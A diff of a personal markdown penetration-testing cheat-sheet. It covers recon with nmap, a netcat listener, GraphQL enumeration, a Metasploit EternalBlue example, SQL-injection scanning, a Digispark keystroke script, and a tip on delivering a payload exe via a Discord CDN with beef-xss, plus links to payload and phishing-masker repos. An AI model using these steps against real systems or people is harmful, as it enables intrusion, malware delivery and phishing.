@@ -1,14 +1,12 @@
 # Security
 
-## ClamAV
-
-### Setup
+##### ClamAV Setup
 
 - Download & Install
 - copy clamd.conf & freshclam.conf to installation folder and comment out `# Example` line in each file
 - open powershell in admin -> `./freshclam.exe`;
 
-### Scan
+##### Scan
 
 ```bash
 # -i display infected files
@@ -19,22 +17,24 @@
 
 [ClamAV Docs](https://docs.clamav.net/Introduction.html)
 
-## Cloud
+---
 
-Start a docker ParrotOS cloud container
+##### Cloud
+
+###### Start a docker ParrotOS cloud container
 
 ```bash
 docker run --name psec1 -ti parrot.run/security
 docker start psec1
 ```
 
-Return to an existing container
+###### Return to an existing container
 
 ```bash
 docker exec -ti psec1 bash
 ```
 
-Other helpful commands
+###### Other helpful commands
 
 ```bash
 docker ps -a // list container
@@ -42,7 +42,7 @@ docker stop psec1 // stop container
 docker rm psec1 // remove container
 ```
 
-Available ParrotOS containers
+###### Available ParrotOS containers
 
 ```
 - parrot.run/core
@@ -55,9 +55,12 @@ Available ParrotOS containers
 - parrot.run/sqlmap (sqlmap)
 ```
 
-## Recon
+---
 
-### Ping
+
+##### Recon
+
+###### Ping
 
 ```bash
 ping <ip>
@@ -66,9 +69,7 @@ ping <ip>
 # Reply from <ip>: bytes=32 time=25ms TTL=(128 for windows, 64 for windows)
 ```
 
-### Nmap
-
-#### Initial discovery
+###### Nmap 
 
 ```bash
 # -sC default scripts
@@ -80,27 +81,31 @@ ping <ip>
 nmap -sC -sV -A -Pn <ip>
 ```
 
-#### Vulnerability analysis
+###### Nmap Vulnerability analysis
 
 ```bash
 ls /usr/share/nmap/scripts/ | grep smb
 nmap --script smb* -p 139 <ip>
 ```
 
-### NetCat
+---
+
+##### NetCat
 
 ```bash
 # nc <options> <port>
 nc -lnvp 443 # start netcat listener on port 443
 ```
 
-### GraphQL
+---
 
-#### Cheat Sheet
+##### GraphQL
+
+###### Cheat Sheet
 
 [graphql vulnerabilities](https://0xn3va.gitbook.io/cheat-sheets/web-application/graphql-vulnerabilities)
 
-#### GraphQLmap
+###### GraphQLmap
 
 Provides options for gathering schema, fuzzing, and injection
 Basic usage
@@ -112,15 +117,13 @@ graphqlmap -u <target>
 graphqlmap > dump_new
 ```
 
-#### Clairvoyance
+###### Clairvoyance
 
 Gathers GraphQL schema from wordlist using discovery methodology on apis with introspection disabled
 
 ```bash
 pip install clairvoyance
-clairvoyance <target>
 ```
-
 ```bash
 # -o schema.json  -- file to output to
 # -w wordlist.txt -- wordlist file (optional)
@@ -131,9 +134,11 @@ clairvoyance <target> -o schema.json -w wordlist.txt --profile slow --progress
 
 Load the output json into [graphql schema viewer](https://ivangoncharov.github.io/graphql-voyager)
 
-## Exploit
+---
 
-### Searchsploit
+##### Exploit
+
+###### Searchsploit
 
 Installation
 
@@ -148,7 +153,7 @@ Use
 searchsploit eternal
 ```
 
-### Metasploit
+###### Metasploit
 
 ```bash
 # example eternal blue
@@ -163,7 +168,7 @@ set lport 4321
 sysinfo
 ```
 
-### Running a manual exploit
+###### Running a manual python exploit
 
 ```bash
 sudo git clone https://github.com/:user/:package.git
@@ -171,9 +176,11 @@ cd package
 pip install -r requirements.txt
 ```
 
-### SQL Injection
+---
 
-#### Damn Small SQLi Scanner
+##### SQL Injection
+
+###### Damn Small SQLi Scanner
 
 ```bash
 sudo git clone https://github.com/stamparm/DSSS.git
@@ -181,17 +188,21 @@ cd DSSS
 python3 dsss.py -u "<target>"
 ```
 
-## General Tips
+---
 
-### Easily deploy an exe
+##### General Tips
+
+###### Easily deploy an exe
 
 - Upload to discord
 - Copy cdn path
 - Use with beef-xss or anywhere else to deliver payload
 
-### Digispark
+---
 
-#### Sample Script
+##### Digispark
+
+###### Sample Script
 
 ```cpp
 #include "DigiKeyboard.h"
@@ -210,30 +221,36 @@ DigiKeyboard.sendKeyStroke(KEY_F); // Fullscreen video
 }
 ```
 
-[convert duckyscript to c++](https://github.com/CedArctic/digiQuack)
-[DigiSpark-Scripts](https://github.com/CedArctic/DigiSpark-Scripts)
-[Additional scripts](https://github.com/MTK911/Attiny85)
-[Flashsploit](https://github.com/thewhiteh4t/flashsploit)
-[hak5rubberducky scripts](https://github.com/hak5/usbrubberducky-payloads)
-[WiFi Duck](https://github.com/SpacehuhnTech/WiFiDuck)
-[Python on a chip](https://github.com/jsnyder/python-on-a-chip)
+###### Digispark Resources
 
-### Online tools
+- [convert duckyscript to c++](https://github.com/CedArctic/digiQuack)
+- [DigiSpark-Scripts](https://github.com/CedArctic/DigiSpark-Scripts)
+- [Additional scripts](https://github.com/MTK911/Attiny85)
+- [Flashsploit](https://github.com/thewhiteh4t/flashsploit)
+- [hak5rubberducky scripts](https://github.com/hak5/usbrubberducky-payloads)
+- [WiFi Duck](https://github.com/SpacehuhnTech/WiFiDuck)
+- [Python on a chip](https://github.com/jsnyder/python-on-a-chip)
 
-[request catcher](https://requestcatcher.com)
-[web hooks](https://webhook.site)
-[graphql schema viewer](https://ivangoncharov.github.io/graphql-voyager)
+---
 
-### Resources
+##### Online tools
 
-[hacktricks](book.hacktricks.xyz)
-[intruder payloads](https://github.com/1N3/IntruderPayloads)
-[url masker](https://github.com/jaykali/maskphish)
-[mgeeky pentest tools](https://github.com/mgeeky/Penetration-Testing-Tools)
-[openvas vulnerability scanner](https://github.com/greenbone/openvas-scanner)
-[swisskyrepo payloads](https://github.com/swisskyrepo/PayloadsAllTheThings)
-[ports list](https://github.com/maraisr/ports-list)
-[clairvoyance graphql](https://github.com/nikitastupin/clairvoyance)
-[graphql map](https://github.com/swisskyrepo/GraphQLmap)
-[cheat sheet](https://0xn3va.gitbook.io/cheat-sheets/)
-[exploitdb](https://gitlab.com/exploit-database/exploitdb)
+- [request catcher](https://requestcatcher.com)
+- [web hooks](https://webhook.site)
+- [graphql schema viewer](https://ivangoncharov.github.io/graphql-voyager)
+
+---
+
+##### Resources
+
+- [hacktricks](book.hacktricks.xyz)
+- [intruder payloads](https://github.com/1N3/IntruderPayloads)
+- [url masker](https://github.com/jaykali/maskphish)
+- [mgeeky pentest tools](https://github.com/mgeeky/Penetration-Testing-Tools)
+- [openvas vulnerability scanner](https://github.com/greenbone/openvas-scanner)
+- [swisskyrepo payloads](https://github.com/swisskyrepo/PayloadsAllTheThings)
+- [ports list](https://github.com/maraisr/ports-list)
+- [clairvoyance graphql](https://github.com/nikitastupin/clairvoyance)
+- [graphql map](https://github.com/swisskyrepo/GraphQLmap)
+- [cheat sheet](https://0xn3va.gitbook.io/cheat-sheets/)
+- [exploitdb](https://gitlab.com/exploit-database/exploitdb)
